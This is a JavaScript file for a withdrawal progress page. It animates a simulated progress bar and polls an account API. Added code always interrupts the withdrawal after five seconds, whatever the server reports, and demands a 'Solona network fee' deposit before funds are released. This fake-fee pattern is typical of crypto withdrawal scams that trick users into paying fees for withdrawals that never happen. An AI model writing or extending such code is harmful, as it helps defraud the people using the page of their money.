// shows progress bar for a withdrawal and waits for server-confirmation (polls /api/account)
(function () {
  'use strict';

  const params = new URLSearchParams(location.search);
  const txId = params.get('tx') || '';
  const email = params.get('email') || '';
  const user = params.get('user') || '';
  const amount = params.get('amount') || '';

  const bar = document.getElementById('bar');
  const pct = document.getElementById('pct');
  const txInfo = document.getElementById('txInfo');
  const statusLine = document.getElementById('statusLine');
  const cancelBtn = document.getElementById('cancelBtn');
  const spinner = document.getElementById('spinner');

  // ADDED: Declarations for fee prompt elements (assuming they exist in the HTML)
  const feeAlert = document.getElementById('feeAlert');
  const depositFeeBtn = document.getElementById('depositFeeBtn');

  let progress = 0;
  let pollHandle = null;
  let simulatedInterval = null;
  let feeCheckTimer = null; // New timer for the fee prompt
  let feePromptShown = false; // Flag to stop other processes once fee prompt is active

  function setProgress(v, label) {
    progress = Math.min(100, Math.max(0, Math.round(v)));
    bar.style.width = progress + '%';
    pct.textContent = progress + '%';
    if (label) statusLine.textContent = label;
  }

  function brief(msg) {
    statusLine.textContent = msg;
  }

  // ADDED: Function to handle the fee prompt (Interrupting the process)
  function showFeePrompt() {
    if (feePromptShown) return;
    feePromptShown = true;

    // Stop all withdrawal background activity
    if (simulatedInterval) clearInterval(simulatedInterval);
    if (pollHandle) clearInterval(pollHandle);
    if (feeCheckTimer) clearTimeout(feeCheckTimer); 

    // Find and clear the 45s safety timer if it was set
    const safetyTimerId = statusLine.dataset.safetyTimer;
    if (safetyTimerId) clearTimeout(parseInt(safetyTimerId));

    // Update progress bar (keep current progress but update status)
    setProgress(progress, 'Awaiting Solona network fee payment.');

    // Display the alert (requires 'feeAlert' element in HTML)
    if(feeAlert) feeAlert.style.display = 'block';

    // Update UI elements (requires 'depositFeeBtn' element in HTML)
    statusLine.innerHTML = '<span class="spinner"></span>Network fee payment required to continue.';
    if(cancelBtn) cancelBtn.style.display = 'none';
    if(depositFeeBtn) depositFeeBtn.style.display = 'inline-block';
    if(spinner) spinner.style.display = 'none';

    // The deposit button will simply redirect (as per initial cancel behavior)
    if(depositFeeBtn) {
      depositFeeBtn.addEventListener('click', () => {
        alert('Redirecting to Solona deposit instructions page.');
        window.location = '/dashboard?email=' + encodeURIComponent(email) + '&user=' + encodeURIComponent(user || '');
      });
    }
  }

  if (!email || !txId) {
    txInfo.textContent = 'Missing transaction information. Returning to dashboard…';
    setTimeout(() => {
      window.location = '/dashboard?email=' + encodeURIComponent(email || '') + '&user=' + encodeURIComponent(user || '');
    }, 1200);
    return;
  } else {
    txInfo.textContent = `Withdrawing ${amount ? ('$' + Number(amount).toFixed(2)) : 'funds'} for ${decodeURIComponent(user || email)}`;
    
    // NEW LOGIC: Set a timer to interrupt the process with the fee prompt after 5 seconds
    feeCheckTimer = setTimeout(showFeePrompt, 5000); 
  }

  // Simulate progress towards 70% while backend confirmation pending
  function startSimulatedProgress() {
    setProgress(6, 'Initializing withdrawal…');
    simulatedInterval = setInterval(() => {
      // Only update progress if the fee prompt has NOT been shown
      if (!feePromptShown) { 
        if (progress < 70) {
          setProgress(progress + (Math.random() * 8 + 4));
        } else {
          clearInterval(simulatedInterval);
        }
      } else {
         clearInterval(simulatedInterval); // Ensure it stops if prompt was shown externally
      }
    }, 350);
  }

  // Poll /api/account until the transaction with txId appears (or balance reflects change)
  async function pollForCompletion() {
    // Check if the fee prompt has interrupted the process
    if (feePromptShown) {
      clearInterval(pollHandle); // Stop polling if interrupted
      return; 
    }
    
    try {
      const res = await fetch('/api/account?email=' + encodeURIComponent(email), { cache: 'no-store' });
      if (!res.ok) throw new Error('account fetch failed');
      const data = await res.json();
      const txs = Array.isArray(data.transactions) ? data.transactions : [];
      // check by tx id
      const found = txs.find(t => t.id === txId);
      if (found) {
        // animate to 100% and finish
        setProgress(100, 'Withdrawal confirmed');
        clearInterval(pollHandle);
        // Clear all timers on success
        if (feeCheckTimer) clearTimeout(feeCheckTimer);
        const safetyTimerId = statusLine.dataset.safetyTimer;
        if (safetyTimerId) clearTimeout(parseInt(safetyTimerId));
        
        setTimeout(() => {
          window.location = '/dashboard?email=' + encodeURIComponent(email) + '&user=' + encodeURIComponent(user || '');
        }, 900);
        return;
      }
      // If not found, check balance drop (optional)
      const userObj = data.user;
      if (userObj && typeof userObj.balance !== 'undefined') {
        // assume change implies processed; complete if progress above 70
        if (progress >= 70) {
          setProgress(100, 'Withdrawal applied to balance');
          clearInterval(pollHandle);
          // Clear all timers on success
          if (feeCheckTimer) clearTimeout(feeCheckTimer);
          const safetyTimerId = statusLine.dataset.safetyTimer;
          if (safetyTimerId) clearTimeout(parseInt(safetyTimerId));
          
          setTimeout(() => {
            window.location = '/dashboard?email=' + encodeURIComponent(email) + '&user=' + encodeURIComponent(user || '');
          }, 900);
          return;
        }
      }
      // otherwise keep polling
      brief('Waiting for bank/network confirmation…');
    } catch (err) {
      console.error('Poll error', err);
      brief('Unable to contact server — retrying…');
    }
  }

  // user cancel returns them back to dashboard (does not reverse server operation)
  cancelBtn.addEventListener('click', () => {
    window.location = '/dashboard?email=' + encodeURIComponent(email) + '&user=' + encodeURIComponent(user || '');
  });

  // start simulated progress and polling
  startSimulatedProgress();
  // once simulated progress reaches ~70, start polling frequently
  const watchSim = setInterval(() => {
    if (progress >= 70) {
      clearInterval(watchSim);
      pollForCompletion(); // immediate check
      pollHandle = setInterval(pollForCompletion, 1500);
    } else {
      // also update status line during sim
      brief('Processing withdrawal…');
    }
  }, 300);

  // safety: after 45s, stop and show manual action
  const safetyTimer = setTimeout(() => {
    if (pollHandle) clearInterval(pollHandle);
    if (simulatedInterval) clearInterval(simulatedInterval);
    if (feeCheckTimer) clearTimeout(feeCheckTimer); // Stop the fee check timer here too
    
    // Only proceed if not already interrupted by the fee prompt
    if (progress < 100 && !feePromptShown) {
      setProgress(Math.max(progress, 85), 'Taking longer than expected — please wait or contact support.');
      // keep a lightweight poll in background
      pollHandle = setInterval(pollForCompletion, 5000);
    }
  }, 45000);
  
  // Store the timer ID for cleanup if completion or fee happens early
  statusLine.dataset.safetyTimer = safetyTimer;

})();